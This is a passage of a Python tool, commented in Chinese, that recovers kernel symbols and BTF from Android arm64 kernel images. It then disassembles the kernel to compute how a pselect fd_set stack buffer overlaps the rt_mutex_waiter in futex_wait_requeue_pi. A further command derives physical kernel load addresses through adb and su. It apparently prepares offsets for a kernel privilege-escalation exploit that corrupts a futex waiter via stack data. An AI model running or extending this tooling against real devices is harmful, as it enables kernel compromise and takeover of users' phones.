            markers_off = (names_end + 3) & ~3
            if markers_off + marker_count * 4 > token_table_off:
                continue
            markers = struct.unpack_from("<%dI" % marker_count, data, markers_off)
            if not markers or markers[0] != 0:
                continue
            if not all(a < b for a, b in zip(markers, markers[1:])):
                continue
            if any(v >= names_end - names_off for v in markers):
                continue
            if any(m != p - names_off
                   for m, p in zip(markers, positions)):
                continue
            candidates.append((markers_off, markers))
        except SystemExit:
            continue
    unique = []
    for item in candidates:
        if item not in unique:
            unique.append(item)
    if len(unique) > 1:
        raise SystemExit("FATAL: 6.1 kallsyms markers 候选不唯一")
    return unique[0] if unique else None


def _locate_markers(data, token_table_off, tokens):
    common = _locate_markers_common(data, token_table_off)
    if len(common) == 1:
        return next(iter(common.items()))
    fb = _locate_markers_61(data, token_table_off, tokens)
    if fb is not None:
        return fb
    raise SystemExit(
        "FATAL: kallsyms markers 候选不唯一/未找到: "
        + repr([(hex(k), len(v)) for k, v in common.items()]))


def _validate_names_candidate(data, names_off, num, markers_off, markers):
    expected = (num + 255) // 256
    if expected != len(markers):
        return False
    pos = names_off
    try:
        for idx in range(num):
            if idx % 256 == 0 and pos - names_off != markers[idx // 256]:
                return False
            pos = _symbol_end(data, pos, markers_off)
    except SystemExit:
        return False
    if pos > markers_off or markers_off - pos > 7:
        return False
    if any(data[pos:markers_off]):
        return False
    return True


def _locate_names(data, markers_off, markers):
    """定位 num_syms (u32) 与 names 流起点."""
    min_num = (len(markers) - 1) * 256 + 1
    max_num = len(markers) * 256
    search_start = max(0, markers_off - min(markers_off, 16 * 1024 * 1024))
    candidates = []
    for num_off in range((search_start + 3) & ~3, markers_off - 4, 4):
        num = struct.unpack_from("<I", data, num_off)[0]
        if not (min_num <= num <= max_num):
            continue
        for gap in range(4, 68, 4):
            names_off = num_off + gap
            if names_off >= markers_off:
                break
            if any(data[num_off + 4:names_off]):
                continue
            if _validate_names_candidate(data, names_off, num, markers_off, markers):
                candidates.append((num_off, names_off))
    unique = []
    for item in candidates:
        if item not in unique:
            unique.append(item)
    if len(unique) != 1:
        raise SystemExit(
            "FATAL: kallsyms num_syms/names 候选不唯一: "
            + repr([(hex(a), hex(b)) for a, b in unique]))
    return struct.unpack_from("<I", data, unique[0][0])[0], unique[0][1]


def _locate_offsets(data, names, image_size):
    """定位 u32 base-relative 地址表: 开头固定点 (_text,_stext→0,0x10000),
    末尾 _end=image_size, 全表单调."""
    first = [n for _, n in names[:3]]
    if len(names) >= 3 and first == ["_text", "__pi__text", "_stext"]:
        signature = struct.pack("<III", 0, 0, 0x10000)
    elif len(names) >= 2 and [n for _, n in names[:2]] == ["_text", "_stext"]:
        signature = struct.pack("<II", 0, 0x10000)
    else:
        raise SystemExit("FATAL: kallsyms 开头符号非固定点: %r" % (first[:3],))
    table_bytes = len(names) * 4
    candidates = []
    pos = 0
    while True:
        pos = data.find(signature, pos)
        if pos < 0:
            break
        if pos & 3 or pos + table_bytes > len(data):
            pos += 1
            continue
        values = struct.unpack_from("<%dI" % len(names), data, pos)
        if values[-1] != image_size:
            pos += 4
            continue
        if any(v > image_size for v in values):
            pos += 4
            continue
        if not all(values[i] <= values[i + 1] for i in range(len(values) - 1)):
            pos += 4
            continue
        candidates.append((pos, values))
        pos += 4
    if len(candidates) != 1:
        raise SystemExit(
            "FATAL: kallsyms u32 地址表候选不唯一: "
            + repr([hex(o) for o, _ in candidates]))
    return candidates[0]


def _infer_relative_base(data, offsets_off, num_syms):
    """offsets 表尾推导 relative_base; 失败则附近扫描规范指针 (按距离评分)."""
    preferred = offsets_off + num_syms * 4
    candidates = []

    def add(off, score):
        if off < 0 or off + 8 > len(data) or off & 7:
            return
        v = struct.unpack_from("<Q", data, off)[0]
        if not _is_kernel_ptr(v):
            return
        if v & 0xFFF:
            score += 0x10000000
        candidates.append((score + abs(off - preferred), off, v))

    add(preferred, 0)
    start = max(0, offsets_off - 0x200000)
    end = min(len(data) - 8, preferred + 0x200000)
    for off in range(start + ((8 - start) & 7), end + 1, 8):
        add(off, 0x1000)
    unique = {}
    for _, off, v in candidates:
        unique.setdefault(off, (_, off, v))
    if not unique:
        raise SystemExit(
            "FATAL: 无法推导 kallsyms_relative_base (offsets=0x%x)" % offsets_off)
    best = sorted(unique.values())[0]
    return best[1], best[2]


def _image_size_from_image(data):
    """arm64 Image 头的 image_size 字段 (偏移 16, u64); 校验 ARM64 magic + 范围."""
    if len(data) < 0x80:
        raise SystemExit("FATAL: 内核 Image 过短")
    if data[0x38:0x3C] != b"ARM\x64":
        raise SystemExit("FATAL: 内核缺少 arm64 Image magic (ARM\\x64 @0x38)")
    image_size = struct.unpack_from("<Q", data, 0x10)[0]
    if image_size < len(data) or image_size > (1 << 32):
        raise SystemExit(
            "FATAL: arm64 Image image_size 异常: 0x%x (文件 %d 字节)"
            % (image_size, len(data)))
    return image_size


def _extract_elf_kernel_section(path):
    """从 kernel.elf 提取 .kernel 段 (内含 arm64 Image)."""
    data = open(path, "rb").read()
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    sections = {}
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = \
            struct.unpack_from("<IIQQQQ", data, off)
        sections[i] = (sh_name, sh_addr, sh_offset, sh_size)
    shstr = sections[e_shstrndx]
    shstr_data = data[shstr[2]:shstr[2] + shstr[3]]

    def sec_name(i):
        o = sections[i][0]
        e = shstr_data.find(b"\0", o)
        return shstr_data[o:e].decode(errors="replace")

    for i in range(e_shnum):
        if sec_name(i) == ".kernel":
            _, addr, offset, size = sections[i]
            return data[offset:offset + size], addr
    raise SystemExit("FATAL: kernel.elf 缺少 .kernel 段")


def recover_kallsyms(kernel_raw, branch="auto"):
    """离线恢复 kallsyms (6.1/6.6/6.12).
    返回 (syms_dict, release_or_None, meta) 或抛 SystemExit."""
    data = kernel_raw
    image_size = _image_size_from_image(data)
    release = _extract_release(data)
    if branch == "auto":
        if release:
            if "6.12" in release:
                branch = "6.12"
            elif "6.6" in release:
                branch = "6.6"
            elif "6.1" in release:
                branch = "6.1"
        if branch == "auto":
            branch = "6.6"
            print("WARN: 无法判定内核分支, 按 6.6 尝试 (可用 --branch 强制)")

    token_table_off, token_index_off, token_index = _find_token_tables(data)
    tokens = _decode_tokens(data, token_table_off, token_index)
    if branch == "6.1":
        markers = _locate_markers_61(data, token_table_off, tokens)
        if markers is None:
            raise SystemExit("FATAL: 6.1 kallsyms markers 定位失败")
        markers_off, markers_vals = markers
    else:
        markers_off, markers_vals = _locate_markers(data, token_table_off, tokens)

    num_syms, names_off = _locate_names(data, markers_off, markers_vals)
    names = []
    pos = names_off
    for _ in range(num_syms):
        symbol, pos = _decode_symbol(data, pos, markers_off, tokens)
        names.append(symbol)
    offsets_off, offsets = _locate_offsets(data, names, image_size)
    relative_base_off, relative_base = _infer_relative_base(
        data, offsets_off, num_syms)

    # 固定点校验: u32 表首 _text=0/_stext=0x10000 已内建; _end=image_size 已内建
    if len(names) != num_syms:
        raise SystemExit("FATAL: kallsyms 符号数不一致")
    syms = {}
    types = {}
    for idx, (typ, name) in enumerate(names):
        if name not in syms:
            syms[name] = offsets[idx]
            types[name] = typ
    meta = {
        "branch": branch,
        "release": release,
        "num_syms": num_syms,
        "token_table_off": token_table_off,
        "markers_off": markers_off,
        "names_off": names_off,
        "offsets_off": offsets_off,
        "relative_base_off": relative_base_off,
        "relative_base": hex(relative_base),
        "image_size": image_size,
    }
    print("offline: 分支=%s 符号数=%d release=%s" % (branch, num_syms, release or "?"))
    print("offline: token_table=0x%x markers=0x%x names=0x%x offsets=0x%x "
          "relative_base=0x%x" % (token_table_off, markers_off, names_off,
                                  offsets_off, relative_base))
    return syms, types, release, meta


def locate_btf(kernel_raw, kallsyms=None):
    """离线定位 vmlinux BTF blob. 返回 (btf_bytes, offset) 或抛 SystemExit."""
    data = kernel_raw
    magic = b"\x9f\xeb\x01\x00"
    candidates = []
    pos = 0
    while True:
        pos = data.find(magic, pos)
        if pos < 0:
            break
        try:
            # 结构校验: magic+ver+flags+hdr_len+type_len+str_len
            if pos + 24 > len(data):
                pos += 1
                continue
            magic2, ver, flags, hdr_len, type_off, type_len, str_off, str_len = \
                struct.unpack_from("<HBBIIIII", data, pos)
            if magic2 != 0xEB9F:
                pos += 1
                continue
            # BTF 段大小 = hdr_len + str_off + str_len (str_off 已含 type 区)
            if type_len > 0x1000 and str_len > 0x1000 and \
                    pos + hdr_len + str_off + str_len <= len(data):
                end = pos + hdr_len + str_off + str_len
                candidates.append((pos, end, type_len, str_len))
        except struct.error:
            pass
        pos += 1
    if len(candidates) != 1:
        raise SystemExit(
            "FATAL: vmlinux BTF 候选不唯一: "
            + repr([(hex(a), hex(b), c, d) for a, b, c, d in candidates]))
    off, end, type_len, str_len = candidates[0]
    # 与 kallsyms __start_BTF/__stop_BTF 闭合 (符号存在时校验)
    if kallsyms:
        st = kallsyms.get("__start_BTF")
        sp = kallsyms.get("__stop_BTF")
        if st is not None and sp is not None:
            if st != off or sp != end:
                raise SystemExit(
                    "FATAL: BTF blob 未与 __start_BTF/__stop_BTF 闭合: "
                    "parsed=[0x%x,0x%x) symbols=[0x%x,0x%x)" % (off, end, st, sp))
    print("offline: BTF @ 0x%x .. 0x%x (types=%d strs=%d)" % (
        off, end, type_len, str_len))
    return data[off:end], off


def _write_kallsyms_text(syms, types, out_path, base):
    """写出 'addr type name' 三列文本 (兼容 parse_kallsyms).
    base=relative_base: 偏移转静态 VA, 避免 _text=0 被 parse_kallsyms 过滤."""
    with open(out_path, "w", encoding="utf-8", newline="\n") as f:
        for name, addr in sorted(syms.items(), key=lambda kv: kv[1]):
            f.write("%016x %s %s\n" % (base + addr, types.get(name, "T"), name))


def cmd_offline(argv, profile, prof_path):
    """offline <素材> --out-dir <dir> [--branch 6.1|6.6|6.12|auto]."""
    if len(argv) < 2:
        raise SystemExit("FATAL: offline 需要 素材 与 --out-dir")
    asset = argv[0]
    out_dir = None
    branch = "auto"
    if "--out-dir" in argv:
        out_dir = argv[argv.index("--out-dir") + 1]
    if "--branch" in argv:
        branch = argv[argv.index("--branch") + 1]
    if out_dir is None:
        raise SystemExit("FATAL: offline 需要 --out-dir")
    if not os.path.exists(asset):
        raise SystemExit("FATAL: 素材不存在: %s" % asset)
    os.makedirs(out_dir, exist_ok=True)

    kind = _asset_kind(asset)
    raw = None
    if kind == "bootimg":
        kernel = _boot_kernel(asset)
        if kernel is None or kernel == b"":
            raise SystemExit(
                "FATAL: boot.img 不含内核 (kernel_size=0, 疑似 init_boot/vendor_boot)")
        raw = kernel
    elif kind == "kernel_elf":
        raw, _base = _extract_elf_kernel_section(asset)
        print("offline: 从 kernel.elf 提取 .kernel 段 (%d 字节)" % len(raw))
    elif kind == "kernel_raw":
        raw = open(asset, "rb").read()
    else:
        raise SystemExit("FATAL: 无法识别素材类型: %s" % asset)

    data, method = _decompress_kernel(raw)
    if method != "raw":
        print("offline: 内核压缩: %s (已解压 %d 字节)" % (method, len(data)))
    syms, types, release, meta = recover_kallsyms(data, branch)
    btf, btf_off = locate_btf(data, syms)

    ks_out = os.path.join(out_dir, "kallsyms.txt")
    btf_out = os.path.join(out_dir, "vmlinux.btf")
    meta_out = os.path.join(out_dir, "offline_meta.json")
    _write_kallsyms_text(syms, types, ks_out, int(meta["relative_base"], 16))
    open(btf_out, "wb").write(btf)
    meta.update({"btf_off": btf_off, "btf_size": len(btf),
                 "kallsyms_out": ks_out, "btf_out": btf_out})
    json.dump(meta, open(meta_out, "w"), indent=2)
    print("offline OK:")
    print("  kallsyms:", ks_out, "(%d 符号)" % len(syms))
    print("  BTF     :", btf_out, "(%d 字节)" % len(btf))
    print("  meta    :", meta_out)
    return 0


# ============================================================
# 8.6 derive-pselect 栈布局推导 (独立实现)
# ============================================================

def _find_objdump(explicit=None):
    """objdump 探测: --objdump > PATH > WSL kali.
    优先 aarch64-linux-gnu-objdump (kernel.elf 用自定义 .kernel/.bss 段,
    普通 objdump 常报 can't disassemble for architecture UNKNOWN)."""
    if explicit and os.path.exists(explicit):
        return ("local", explicit)
    if explicit:
        return ("wsl", explicit)
    for name in ("llvm-objdump", "aarch64-linux-gnu-objdump", "objdump"):
        p = shutil.which(name) if hasattr(shutil, "which") else None
        if p:
            return ("local", p)
    try:
        r = subprocess.run(
            ["wsl", "-d", "kali-linux", "--", "bash", "-lc",
             "command -v aarch64-linux-gnu-objdump 2>/dev/null || "
             "command -v llvm-objdump 2>/dev/null || command -v objdump 2>/dev/null"],
            capture_output=True, text=True, timeout=15)
        if r.returncode == 0 and r.stdout.strip():
            return ("wsl", r.stdout.strip().splitlines()[0])
    except Exception:
        pass
    return None


def _wsl_path(path):
    p = path.replace("\\", "/")
    if re.match(r"^[A-Za-z]:", p):
        return "/mnt/" + p[0].lower() + p[2:]
    return p


def _disasm_sym(objdump, kind, elf_path, sym_va, window=0x2000):
    """反汇编符号范围, 返回指令列表 [(addr, mnemonic, op_str)]."""
    start = sym_va
    end = sym_va + window
    if kind == "local":
        r = subprocess.run(
            [objdump, "-d", "--start-address=0x%x" % start,
             "--stop-address=0x%x" % end, elf_path],
            capture_output=True, text=True, timeout=120)
    else:
        welf = _wsl_path(elf_path)
        cmd = ("%s -d --start-address=0x%x --stop-address=0x%x '%s'"
               % (objdump, start, end, welf))
        r = subprocess.run(
            ["wsl", "-d", "kali-linux", "--", "bash", "-lc", cmd],
            capture_output=True, text=True, timeout=120)
    insns = []
    for line in r.stdout.splitlines():
        m = re.match(r"\s*([0-9a-f]+):\s+[0-9a-f]+\s+([a-z][a-z0-9_.]*)\s*(.*)", line)
        if m:
            insns.append((int(m.group(1), 16), m.group(2), m.group(3).strip()))
    return insns


def _has_bl_to(insns, target_va):
    for addr, mn, op in insns:
        if mn != "bl":
            continue
        # aarch64-linux-gnu-objdump: "bl ffffffc0803e3498 <core_sys_select>"
        # llvm-objdump:                "bl 0xffffffc0803e3498 <core_sys_select>"
        if re.search(r"\b%x\b" % target_va, op, re.I):
            return True
    return False


def _first_sp_add(insns, prefix=""):
    """第一个 'add xN, sp, #imm' (可限定指令前缀如函数内)."""
    for addr, mn, op in insns:
        m = re.match(r"add\s+(x\d+),\s*sp,\s*#0x([0-9a-f]+)", op, re.I)
        if m:
            return (m.group(1), int(m.group(2), 16))
    return None


def cmd_derive_pselect(argv, profile, prof_path):
    """derive-pselect <kernel.elf> --kallsyms <kallsyms.txt> --btf <vmlinux.btf>
    [-o pselect.json] [--objdump <path>]."""
    if len(argv) < 1:
        raise SystemExit("FATAL: derive-pselect 需要 kernel.elf")
    elf = argv[0]
    ks_path = None
    btf_path = None
    out_path = None
    objdump_arg = None
    nfds = 264
    if "--kallsyms" in argv:
        ks_path = argv[argv.index("--kallsyms") + 1]
    if "--btf" in argv:
        btf_path = argv[argv.index("--btf") + 1]
    if "-o" in argv:
        out_path = argv[argv.index("-o") + 1]
    if "--objdump" in argv:
        objdump_arg = argv[argv.index("--objdump") + 1]
    if "--nfds" in argv:
        nfds = int(argv[argv.index("--nfds") + 1])
    if not os.path.exists(elf):
        raise SystemExit("FATAL: kernel.elf 不存在: %s" % elf)
    if not ks_path or not os.path.exists(ks_path):
        raise SystemExit("FATAL: derive-pselect 需要 --kallsyms (建议用 offline 产物, 静态 VA)")
    if not btf_path or not os.path.exists(btf_path):
        raise SystemExit("FATAL: derive-pselect 需要 --btf (建议用 offline 产物)")

    objdump = _find_objdump(objdump_arg)
    if objdump is None:
        raise SystemExit(
            "FATAL: 未找到 objdump (Windows PATH 或 WSL kali); 可 --objdump <路径>")
    kind, obj = objdump

    syms, _stype, _all = parse_kallsyms(ks_path)
    types = parse_btf_full(btf_path)

    def sym(name):
        v = syms.get(name)
        if v is None:
            raise SystemExit("FATAL: kallsyms 缺少符号: %s" % name)
        return v

    psel_w = sym("__arm64_sys_pselect6")
    core = sym("core_sys_select")
    futex_w = sym("__arm64_sys_futex")
    futex_wait = sym("futex_wait_requeue_pi")
    do_pselect = syms.get("do_pselect")
    do_futex = syms.get("do_futex")

    dis = {}
    for key, va in (("pselect_wrapper", psel_w), ("pselect_core", core),
                    ("futex_wrapper", futex_w), ("futex_wait", futex_wait)):
        dis[key] = _disasm_sym(obj, kind, elf, va)
        if not dis[key]:
            raise SystemExit("FATAL: 反汇编为空: %s @0x%x" % (key, va))
    if do_pselect:
        dis["pselect_dispatch"] = _disasm_sym(obj, kind, elf, do_pselect)
    if do_futex:
        dis["futex_dispatch"] = _disasm_sym(obj, kind, elf, do_futex)

    # 调用链建图 (pselect: wrapper -> [do_pselect] -> core; futex: wrapper -> [do_futex] -> wait)
    pchain = ["pselect_wrapper"]
    if _has_bl_to(dis["pselect_wrapper"], core):
        pass
    elif do_pselect and _has_bl_to(dis["pselect_wrapper"], do_pselect):
        if not _has_bl_to(dis["pselect_dispatch"], core):
            raise SystemExit("FATAL: do_pselect 未直接调用 core_sys_select")
        pchain.append("pselect_dispatch")
    else:
        raise SystemExit("FATAL: __arm64_sys_pselect6 调用链无法确认")
    pchain.append("pselect_core")

    fchain = ["futex_wrapper"]
    if _has_bl_to(dis["futex_wrapper"], futex_wait):
        fchain.append("futex_wait")
    elif do_futex and _has_bl_to(dis["futex_wrapper"], do_futex):
        if not _has_bl_to(dis["futex_dispatch"], futex_wait):
            raise SystemExit("FATAL: do_futex 未直接调用 futex_wait_requeue_pi")
        fchain.append("futex_dispatch")
        fchain.append("futex_wait")
    else:
        raise SystemExit("FATAL: __arm64_sys_futex 调用链无法确认")

    # waiter 栈局部: futex_wait 里 'add xN, sp, #imm' 且后续 'add xN, xN, #pi_tree'
    rtw = [t for t in types[1:] if t["kind"] == 4 and t["name"] == "rt_mutex_waiter"]
    pi_tree = None
    if rtw:
        t = max(rtw, key=lambda x: len(x["members"]))
        pi_tree = btf_member(types, t, "pi_tree")
    waiter_local = None
    for addr, mn, op in dis["futex_wait"]:
        if mn != "add":
            continue
        m = re.match(r"(x\d+),\s*sp,\s*#0x([0-9a-f]+)", op, re.I)
        if not m:
            continue
        reg, imm = m.group(1), int(m.group(2), 16)
        if pi_tree is not None:
            for _a, _mn, _op in dis["futex_wait"]:
                # 'add x任意, <reg>, #pi_tree' (目标寄存器可与 reg 不同)
                if _mn == "add" and re.match(
                        r"x\d+,\s*" + reg + r",\s*#0x%x" % pi_tree, _op, re.I):
                    waiter_local = imm
                    break
        if waiter_local is not None:
            break
    if waiter_local is None:
        raise SystemExit("FATAL: futex waiter 栈局部定位失败")

    # 帧大小 (函数开头 sub sp, sp, #imm)
    def _frame(insns):
        for _a, mn, op in insns:
            if mn == "sub":
                m = re.match(r"sp,\s*sp,\s*#0x([0-9a-f]+)", op, re.I)
                if m:
                    return int(m.group(1), 16)
        return 0

    frames = {k: _frame(v) for k, v in dis.items()}

    # pselect fd_set 栈缓冲区: 'add xN, sp, #imm' 且该 reg 有 'mov reg, x0'
    # (buffer 首地址), 且有同 imm 的 peer 寄存器之间 cmp 交叉验证
    add_sp = []
    for _a, mn, op in dis["pselect_core"]:
        if mn == "add":
            m = re.match(r"(x\d+),\s*sp,\s*#0x([0-9a-f]+)", op, re.I)
            if m:
                add_sp.append((m.group(1).lower(), int(m.group(2), 16)))
    buffer_candidates = set()
    for reg, imm in add_sp:
        if not any(_mn == "mov" and re.match(reg + r",\s*x0", _op, re.I)
                   for _a2, _mn, _op in dis["pselect_core"]):
            continue
        peers = {peer for peer, peer_imm in add_sp
                 if peer_imm == imm and peer != reg}
        crossed = False
        for peer in peers:
            if any(_mn == "cmp" and re.match(reg + r",\s*" + peer, _op, re.I)
                   for _a2, _mn, _op in dis["pselect_core"]):
                crossed = True
            if any(_mn == "cmp" and re.match(peer + r",\s*" + reg, _op, re.I)
                   for _a2, _mn, _op in dis["pselect_core"]):
                crossed = True
        if crossed:
            buffer_candidates.add(imm)
    if len(buffer_candidates) != 1:
        raise SystemExit(
            "FATAL: core_sys_select 栈 fdset buffer 候选不唯一: "
            + repr(sorted(buffer_candidates)))
    pselect_buffer = next(iter(buffer_candidates))

    # nfds 阈值校验: core_sys_select 内 cmp xN, #th (fds_bytes < th <= fds_bytes+8)
    fds_bytes = ((nfds + 63) // 64) * 8
    thresholds = []
    for _a, _mn, _op in dis["pselect_core"]:
        if _mn == "cmp":
            m = re.match(r"x\d+,\s*#0x([0-9a-f]+)", _op, re.I)
            if m:
                thresholds.append(int(m.group(1), 16))
    if not any(fds_bytes < th <= fds_bytes + 8 for th in thresholds):
        raise SystemExit(
            "FATAL: core_sys_select 未证明 nfds=%d 走栈 fdset 路线" % nfds)

    # 帧叠加: 顶层 wrapper sp 视角的 pselect 覆盖点 / futex waiter 位置
    pselect_word0 = -sum(frames[k] for k in pchain) + pselect_buffer
    futex_waiter = -sum(frames[k] for k in fchain) + waiter_local
    delta = futex_waiter - pselect_word0
    if delta < 0 or delta % 8:
        raise SystemExit("FATAL: pselect/futex 栈重叠差非法: %d" % delta)
    shift = delta // 8
    if shift > 16:
        raise SystemExit("FATAL: PSELECT_WAITER_WORD_SHIFT 异常过大: %d" % shift)
    words_per_set = (nfds + 63) // 64
    ww_ctx = None
    if rtw:
        t2 = max(rtw, key=lambda x: len(x["members"]))
        for m in t2["members"]:
            if m["name"] == "ww_ctx":
                ww_ctx = m["bit"] >> 3
    map_ww_ctx = int(ww_ctx is not None and
                     (shift + ww_ctx // 8) < 3 * words_per_set)

    result = {
        "psselect_waiter_word_shift": shift,
        "pselect_map_ww_ctx": map_ww_ctx,
        "waiter_local_off": waiter_local,
        "pselect_word0_relative": pselect_word0,
        "futex_waiter_relative": futex_waiter,
        "pselect_buffer_off": pselect_buffer,
        "pselect_route_nfds": nfds,
        "fds_bytes": fds_bytes,
        "pselect_chain": pchain,
        "futex_chain": fchain,
        "pi_tree_off": pi_tree,
        "frames": frames,
        "status": "ok",
    }
    print(json.dumps(result, indent=2))
    if out_path:
        json.dump(result, open(out_path, "w"), indent=2)
        print("pselect saved:", out_path)
    return 0


# ============================================================
# 8.7 detect-p0 物理常量自动获取 (独立实现)
# ============================================================

_ARM64_MEMSTART_ALIGN = 1 << 30
_ARM64_STEXT_OFFSET = 0x10000
_PAGE_SIZE = 0x1000


def _parse_iomem(text):
    """解析 /proc/iomem → [(start, end_exclusive, name)]."""
    ranges = []
    for line in text.splitlines():
        m = re.match(r"^\s*([0-9a-fA-F]+)-([0-9a-fA-F]+)\s*:\s*(.*?)\s*$", line)
        if not m:
            continue
        start = int(m.group(1), 16)
        end = int(m.group(2), 16) + 1
        if end < start:
            raise SystemExit("FATAL: 非法 /proc/iomem 区间: %s" % line.strip())
        ranges.append((start, end, m.group(3)))
    if not ranges:
        raise SystemExit("FATAL: /proc/iomem 解析为空")
    return ranges


def _parse_fdt_memory(dtb):
    """解析 FDT (magic 0xd00dfeed) memory 节点 reg → 返回首块物理地址或 None."""
    if len(dtb) < 40:
        return None
    if struct.unpack_from(">I", dtb, 0)[0] != 0xD00DFEED:
        return None
    off_struct = struct.unpack_from(">I", dtb, 0x08)[0]
    off_strings = struct.unpack_from(">I", dtb, 0x0C)[0]
    size_strings = struct.unpack_from(">I", dtb, 0x20)[0]
    if off_struct >= len(dtb) or off_strings >= len(dtb):
        return None
    strings = dtb[off_strings:min(off_strings + size_strings, len(dtb))]

    def sname(o):
        e = strings.find(b"\x00", o)
        if 0 <= o < len(strings) and e >= 0:
            return strings[o:e].decode(errors="replace")
        return ""

    pos = off_struct
    current = None
    memory_reg = None
    while pos + 4 <= len(dtb):
        tok = struct.unpack_from(">I", dtb, pos)[0]
        pos += 4
        if tok == 0x1:                       # FDT_BEGIN_NODE
            e = dtb.find(b"\x00", pos)
            if e < 0:
                break
            current = dtb[pos:e].decode(errors="replace")
            if "@" in current:               # memory@80000000 -> memory
                current = current.split("@")[0]
            pos = (e + 1 + 3) & ~3
        elif tok == 0x2:                     # FDT_END_NODE
            current = None
        elif tok == 0x3:                     # FDT_PROP
            if pos + 8 > len(dtb):
                break
            plen = struct.unpack_from(">I", dtb, pos)[0]
            nameoff = struct.unpack_from(">I", dtb, pos + 4)[0]
            pos += 8
            if pos + plen > len(dtb):
                break
            pname = sname(nameoff)
            data = dtb[pos:pos + plen]
            pos = (pos + plen + 3) & ~3
            if current == "memory":
                if pname == "device_type" and data.rstrip(b"\x00") != b"memory":
                    current = None          # 名字巧合, 非内存节点
                elif pname == "reg" and memory_reg is None and len(data) >= 8:
                    addr_hi, addr_lo = struct.unpack_from(">II", data, 0)
                    memory_reg = (addr_hi << 32) | addr_lo
        elif tok == 0x4:                     # FDT_NOP
            continue
        elif tok == 0x9:                     # FDT_END
            break
        else:
            break
    return memory_reg


def _read_devicetree_memory_adb(serial):
    """adb (非 root) 读 /sys/firmware/devicetree/base/memory/reg → 首块 RAM 起点."""
    try:
        r = subprocess.run(
            ["adb", "-s", serial, "shell",
             "cat /sys/firmware/devicetree/base/memory/reg"],
            capture_output=True, timeout=30)
    except Exception as e:
        raise SystemExit("FATAL: adb 调用失败: %s" % e)
    data = r.stdout
    if r.returncode != 0 or len(data) < 8:
        raise SystemExit("FATAL: 设备 devicetree memory/reg 不可读 (非 root 需内核开放)")
    data = data[:len(data) // 8 * 8]
    addr = struct.unpack_from(">Q", data, 0)[0]
    return addr


def _detect_p0_from_iomem(text):
    """推导 (phys_offset, kernel_phys_load) + 6 项反向校验."""
    ranges = _parse_iomem(text)
    system_ram = [r for r in ranges if r[2] == "System RAM"]
    kernel_code = [r for r in ranges if r[2] == "Kernel code"]
    if not system_ram:
        raise SystemExit("FATAL: /proc/iomem 缺少 System RAM")
    if len(kernel_code) != 1:
        raise SystemExit("FATAL: Kernel code 区间数量异常: %d" % len(kernel_code))
    code_start = kernel_code[0][0]
    if code_start < _ARM64_STEXT_OFFSET:
        raise SystemExit("FATAL: Kernel 地址被隐藏或非法")
    kernel_phys_load = code_start - _ARM64_STEXT_OFFSET
    containing = [r for r in system_ram if r[0] <= kernel_phys_load < r[1]]
    if len(containing) != 1:
        raise SystemExit("FATAL: Kernel code 未唯一包含于 System RAM")
    # phys_offset 基于内核实际加载的 RAM 块起点 (低端小块如 0x1000 固件保留区
    # 不属于主 RAM 起点; 若按 min(System RAM) 会被误算为 0x0)
    first_ram = containing[0][0]
    phys_offset = first_ram & -_ARM64_MEMSTART_ALIGN
    # 反向校验 (闭环, 任一失败即失败)
    if first_ram - phys_offset >= _ARM64_MEMSTART_ALIGN:
        raise SystemExit("FATAL: PHYS_OFFSET 向下取整不变式失败")
    if phys_offset % _ARM64_MEMSTART_ALIGN != 0:
        raise SystemExit("FATAL: PHYS_OFFSET 非 1GiB 对齐")
    if kernel_phys_load % _PAGE_SIZE != 0:
        raise SystemExit("FATAL: Kernel Image 加载地址非页对齐")
    if kernel_phys_load + _ARM64_STEXT_OFFSET != code_start:
        raise SystemExit("FATAL: Kernel code 回推失败")
    if kernel_phys_load < phys_offset:
        raise SystemExit("FATAL: Kernel Image 加载地址先于 PHYS_OFFSET")
    return phys_offset, kernel_phys_load


def _read_iomem_adb(serial):
    """adb su -c cat /proc/iomem (校验 uid=0)."""
    try:
        r = subprocess.run(
            ["adb", "-s", serial, "shell", "su", "-c", "cat /proc/iomem"],
            capture_output=True, text=True, timeout=30)
    except Exception as e:
        raise SystemExit("FATAL: adb 调用失败: %s" % e)
    if r.returncode != 0:
        raise SystemExit("FATAL: adb su 失败: %s" % r.stderr.strip()[:200])
    return r.stdout


def _update_profile_p0(profile_path, phys_offset, kernel_phys_load):
    """原子更新 profile 的 p0 字段 (先备份)."""
    if not os.path.exists(profile_path):
        raise SystemExit("FATAL: profile 不存在: %s" % profile_path)
    data = json.load(open(profile_path, encoding="utf-8"))
    bak = profile_path + ".bak"
    shutil.copyfile(profile_path, bak)
    data["p0_phys_offset"] = hex(phys_offset)
    data["p0_kernel_phys_load"] = hex(kernel_phys_load)
    tmp = profile_path + ".tmp"
    json.dump(data, open(tmp, "w", encoding="utf-8"), indent=2, ensure_ascii=False)
    os.replace(tmp, profile_path)
    print("profile 已更新: %s (备份: %s)" % (profile_path, bak))


def cmd_detect_p0(argv, profile, prof_path):
    """detect-p0 [--iomem <文件>] [--devicetree] [--serial <sn>] [--write-profile <json>].
    P0 来源自动顺序: --iomem (root, 精确) > --devicetree (非 root, 实测) > 缺省自动尝试."""
    iomem_file = None
    serial = None
    write_profile = None
    use_devicetree = False
    if "--iomem" in argv:
        iomem_file = argv[argv.index("--iomem") + 1]
    if "--serial" in argv:
        serial = argv[argv.index("--serial") + 1]
    if "--write-profile" in argv:
        write_profile = argv[argv.index("--write-profile") + 1]
    if "--devicetree" in argv:
        use_devicetree = True

    if iomem_file:
        if not os.path.exists(iomem_file):
            raise SystemExit("FATAL: iomem 文件不存在: %s" % iomem_file)
        text = open(iomem_file, encoding="utf-8", errors="replace").read()
        src = iomem_file
        phys_offset, kernel_phys_load = _detect_p0_from_iomem(text)
        print("来源: %s" % src)
        print("p0_phys_offset: %#x" % phys_offset)
        print("p0_kernel_phys_load: %#x" % kernel_phys_load)
        print("校验: 通过 (1GiB 对齐 / 页对齐 / RAM 包含 / code 回推)")
        if write_profile:
            _update_profile_p0(write_profile, phys_offset, kernel_phys_load)
        return 0

    # devicetree / 自动: 设备在线 (非 root 可读 /sys/firmware/devicetree)
    if not serial:
        try:
            r = subprocess.run(["adb", "devices"], capture_output=True,
                               text=True, timeout=10)
            devs = [ln.split()[0] for ln in r.stdout.splitlines()[1:]
                    if len(ln.split()) >= 2 and ln.split()[1] == "device"]
        except Exception:
            devs = []
